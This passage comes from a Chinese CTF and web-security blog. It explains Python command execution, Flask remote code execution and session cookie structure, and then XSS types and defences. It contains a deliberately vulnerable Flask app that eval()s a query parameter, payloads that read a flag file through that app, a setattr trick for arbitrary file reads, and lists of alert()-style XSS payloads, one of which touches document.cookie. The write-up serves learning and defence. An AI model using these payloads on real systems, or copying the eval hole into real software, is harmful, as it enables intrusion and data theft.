title="os.popen:"></a><code>os.popen</code>:</h4><p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p><pre><code class="highlight python"><span class="keyword">import</span> osout=os.popen(<span class="string">&#x27;dir&#x27;</span>)<span class="built_in">print</span>(out.read())</code></pre><h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>可以认为subprocess是os模块的安全版</p><h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>基本是subprocess中最常用的模块,包含下列参数</p><pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre><hr><pre><code class="highlight plaintext">1.唯一一个必须要有的参数,为一个字符串列表/字符串,其中第一个值是一个应用程序,后面的则是传递的参数</code></pre><pre><code class="highlight python"><span class="keyword">import</span> subprocessout=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="built_in">print</span>(out.stdout)</code></pre><p>这也是我们常说的弹计算器命令,但是需要注意,由于windows并不是像linux那样由纯文件组成,所以这里的列表中无法直接使用dir命令如<code>[&quot;dir&quot;]</code>(本质上这个dir是传递给windows.cmd的一个参数,但是这个windows.cmd程序的位置找不到)</p><hr><pre><code class="highlight plaintext">2.shell=True,默认为false</code></pre><p>用于控制是否允许在第一个参数处直接使用shell命令的,开启后则可以不使列表而是以字符串形式直接使用,如:</p><pre><code class="highlight python"><span class="keyword">import</span> subprocessout=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="built_in">print</span>(out.stdout)</code></pre><p>复现效果：</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p><hr><pre><code class="highlight plaintext">3.stdin,stdout,stderr,默认为false</code></pre><p>这三个参数用来设置输入,输出和错误信息为管道对象或是类文件对象,这里不常用.</p><hr><pre><code class="highlight plaintext">4.capture_output=true,默认为false</code></pre><p>用于捕获stdout和stderr时期不会输出到终端而是作为一个对象来返回.</p><hr><pre><code class="highlight plaintext">5.text=true,默认为false</code></pre><p>默认状态下返回的数据为字节流,而<code>text=true</code>可以使得返回的数据为字符串而不是字节流,不用人手动转换.</p><hr><pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre><p>如果指定了参数,则stdin,stdout,stderr可以接受该类型的数据,否则默认为字节流.可以认为是<code>text=true</code>的一个手动选择版</p><hr><pre><code class="highlight plaintext">7.timeout</code></pre><p>设置命令超时时间.如果命令执行时间超时,子进程将被杀死,并弹出 <code>TimeoutExpired</code>异常.</p><hr><pre><code class="highlight plaintext">8.check=true</code></pre><p>如果该参数设置为<code>True</code>,并且进程退出状态码不是0,则弹出<code>CalledProcessError</code>异常.</p><h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>是subprocess方法的核心,可用于实现更为复杂的功能</p><p>具体介绍就不给了，给两个大佬的博客自己选择着看看把(</p><p><a href="https://www.cnblogs.com/-qing-/p/10934322.html">Python之subprocess模块 - 卿先生 - 博客园</a></p><p><a href="https://www.cnblogs.com/yifengyu/p/16115712.html">python中的subprocess.Popen()、PIPE使用详解 - 平行时空的旅者 - 博客园</a></p><p>直接开始本地复现</p><pre><code class="highlight plaintext">import  subprocessp = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre><p>在linux成功复现</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p><p>反观windows(</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png" alt="image-20250325191725159"></p><p>修了一下，是编码问题+一个stdout和stderr未重定向到PIPE的问题</p><p>修了一下成功读取</p><pre><code class="highlight python"><span class="keyword">import</span>  subprocessp = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=<span class="string">&quot;gbk&quot;</span>)stdout, stderr = p.communicate()<span class="built_in">print</span>(stdout)</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p><h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p><p>用于执行系统命令,并将stdout和stderr直接捕获(不输出到终端)并以字符串形式返回</p><pre><code class="highlight python"><span class="keyword">import</span> os<span class="keyword">import</span> subprocessout=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># 到这还没有输出</span><span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre><h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p><pre><code class="highlight python"><span class="keyword">import</span> subprocessout=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># 到这还没有输出</span><span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre><h4 id="subprocess-call-及check-call"><a href="#subprocess-call-及check-call" class="headerlink" title="subprocess.call() 及check_call()"></a><code>subprocess.call() </code>及<code>check_call()</code></h4><p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br><code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p><h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p><pre><code class="highlight python"><span class="keyword">import</span> os<span class="keyword">import</span> subprocess<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Responseapp = Flask(__name__)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">index</span>():    <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre><h3 id="eval和exec"><a href="#eval和exec" class="headerlink" title="eval和exec"></a>eval和exec</h3><p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p><pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_fileapp = Flask(__name__)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">index</span>():    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&quot;cmd&quot;</span>):        <span class="keyword">return</span> send_file(<span class="string">&quot;app.py&quot;</span>)    <span class="keyword">else</span>:        cmd=request.args.get(<span class="string">&quot;cmd&quot;</span>)        res=<span class="built_in">eval</span>(cmd)        <span class="keyword">return</span> res<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre><p>payload:</p><pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).stdout?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;cat /flag&quot;</span>,shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre><p>这里面的<code>__import__(&quot;os&quot;)</code>一类的用法是用于动态导入模块的.</p><h2 id="Flask-RCE利用-内存马篇"><a href="#Flask-RCE利用-内存马篇" class="headerlink" title="Flask RCE利用(内存马篇)"></a>Flask RCE利用(内存马篇)</h2><p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p><h3 id="static-folder-任意文件读取"><a href="#static-folder-任意文件读取" class="headerlink" title="static_folder 任意文件读取"></a>static_folder 任意文件读取</h3><p>flask在初始化的时候 会设置很多内部的属性</p><pre><code class="highlight plaintext">pythondef __init__(        self,        import_name: str,        static_url_path: str | None = None,        static_folder: str | os.PathLike | None = &quot;static&quot;,        static_host: str | None = None,        host_matching: bool = False,        subdomain_matching: bool = False,        template_folder: str | os.PathLike | None = &quot;templates&quot;,        instance_path: str | None = None,        instance_relative_config: bool = False,        root_path: str | None = None,    ):    #还有一些其他的成员self.config 用来存储配置  self.extensions 用来存储扩展的状态。self.aborter 和 self.url_build_error_handlers 用来处理 HTTP 错误和 URL 构建错误。self.teardown_appcontext_funcs 和 self.shell_context_processors 用来管理应用上下文和 shell 上下文。self.blueprints 用来组织应用的模块化功能，self.url_map 管理路由规则。self.url_map 储存了应用的路由信息self.add_url_rule用来添加 URL 规则</code></pre><p>注意到是这个</p><pre><code class="highlight plaintext">plaintextstatic_url_path: str | None = None 指定静态文件的 URL 路径（即浏览器中访问静态文件的路径）static_folder 指定静态文件所在的文件夹路径</code></pre><p>如果我们修改了相关的值 就可能会造成任意文件读取</p><p>不过在参数传递的时候 不可以使用&#x3D;给这些东西赋值 需要使用setattr这个给他们赋值</p><pre><code class="highlight plaintext">plaintextsetattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre><h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h2 id="Flask-RCE利用-debug篇"><a href="#Flask-RCE利用-debug篇" class="headerlink" title="Flask RCE利用(debug篇)"></a>Flask RCE利用(debug篇)</h2><h2 id="一些辅助工作"><a href="#一些辅助工作" class="headerlink" title="一些辅助工作"></a>一些辅助工作</h2><p>一般会在一开始套个session 的验证</p><p>这里就要用到session伪造的芝士了，首先了解一下session罢</p><p>1）flask session 分析<br>flask对session的处理位于flask&#x2F;sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p><pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw1</code></pre><ul><li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li></ul><pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息1</code></pre><ul><li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li><li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li></ul><p>[参考文章]: <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>“flask框架漏洞”<br>[参考文章]: <a href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>“python rce”</p>]]></content>
      
      
      
        <tags>
            
            <tag> -Web -CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解XSS注入</title>
      <link href="/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;&quot;byd被我注入了吧&quot;</code></pre><h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p><ul><li><p>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js</p><p>代码）</p></li></ul><p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p><p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre><p>反射型 XSS 的 Payload 如下</p><pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li>“&gt;闭合绕过</li></ul><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre><h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre><h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre><h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre><h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre><h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h2 id="常用标签语句"><a href="#常用标签语句" class="headerlink" title="常用标签语句"></a>常用标签语句</h2><h3 id><a href="#" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><p>哈哈，经典款，鉴定为第一个过滤的</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</code></pre><h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>也是经典款(指html里面)</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span><span class="string">&lt;a href=&quot;</span>x<span class="string">&quot; onfocus=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/<span class="selector-tag">a</span>&gt;&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;<span class="comment">/*呃呃，感觉要多记这些属性，反正前端设计也要用到*/</span></code></pre><h3 id="-2"><a href="#-2" class="headerlink" title="&lt;img&gt;"></a>&lt;<code>img&gt;</code></h3><p>作为一个图片触发，成功触发会显示一个破损的图片</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=&quot;alert(<span class="number">1</span>)&quot;&gt;&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=eval(&quot;alert(<span class="number">1</span>)&quot;)&gt;&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre><h3 id="-3"><a href="#-3" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><p>内嵌框架元素</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/iframe&gt;</span><span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(document.cookie)<span class="string">&quot;&gt;&lt;/iframe&gt;</span><span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;&lt;<span class="selector-tag">iframe</span> onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;&lt;<span class="selector-tag">iframe</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><h3 id="-4"><a href="#-4" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><p>音频元素</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">audio</span> <span class="attribute">src</span>=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;&lt;<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">audio</span> controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">audio</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;</code></pre><h3 id="video"><a href="#video" class="headerlink" title="video"></a><code>video</code></h3><p>视频元素</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">video</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=alert(<span class="number">1</span>)&gt;&lt;<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">source</span> onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">video</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">video</span> controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">video</span> controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;</code></pre><h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a><code>svg</code></h3><p>矢量图片元素</p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">svg</span> onload=javascript:<span class="built_in">alert</span>(<span class="number">1</span>)&gt;&lt;svg onload=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/svg&gt;</code></pre><h3 id="-5"><a href="#-5" class="headerlink" title="&lt;button&gt;"></a><code>&lt;button&gt;</code></h3><p>元素上点击鼠标时触发（<del>因为人叫button</del></p><p>元素内部构造:</p><pre><code class="highlight css">&lt;<span class="selector-tag">button</span> onclick=alert(<span class="number">1</span>)&gt;&lt;<span class="selector-tag">button</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;&lt;<span class="selector-tag">button</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;&lt;<span class="selector-tag">button</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;&lt;<span class="selector-tag">button</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;&lt;<span class="selector-tag">button</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;&lt;<span class="selector-tag">button</span> onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">button</span>&gt;</code></pre><h3 id="-6"><a href="#-6" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>html当中常规的切割元素，但是需要urlcode来进行绕过</p><pre><code class="highlight css">原代码：&lt;<span class="selector-tag">div</span> onmouseover=&#x27;alert(<span 